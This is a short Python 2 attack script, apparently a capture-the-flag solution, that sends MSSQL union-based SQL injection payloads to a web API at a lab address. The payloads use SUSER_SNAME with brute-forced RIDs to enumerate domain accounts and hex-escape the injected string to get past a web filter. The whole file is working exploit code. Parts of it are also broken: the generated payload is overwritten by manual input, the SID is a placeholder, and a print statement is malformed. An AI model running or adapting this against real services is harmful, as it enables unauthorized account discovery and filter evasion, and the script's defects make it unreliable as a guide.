#!/usr/bin/env python
import requests
import re
import time

def little(s):
    try:
        t = bytearray.fromhex(s)
        t.reverse()
        return "".join(format(x,"02x") for x in t).upper()
    except:
        print ("Done Cracking")
        exit(0)

if __name__ == "__main__":
    i = 1100
    SID = "======0x01050000000000051/------------SID---------------/1F1492BDFC236==========" #SID
    URL = "http://10.10.10.179/api/getColleagues"
        
    for x in range(1100,6100,1000):
        for i in range(15):
            JUNK = "0" + hex((x + i))[2:].upper()
            RID = SID + little(JUNK) + 4 * "0"
            payload = "-' union select 1,2,3,4,SUSER_SNAME({})-- -".format(RID)
            payload = raw_input("Enter Payload: ")  #we enter the SID we got
            text = re.compile(r"([0-9a-f]{2})")
            encpyload = text.sub(r"\\u00\1", payload.encode("hex"))
            r = requests.post(URL, data='{"name": "' + encpyload + '"}', headers = {"Content-Type":"application/json;charset=utf-8"})
            if "403 - Forbidden: Access is denied." in r.text:
                print ("403 - Forbidden: Access is denied")
                time.sleep(10)
                continue
            if "\\" in r.text:
                print ("" + format(RID)), ("\n" + r.text)
                            
            i += 1

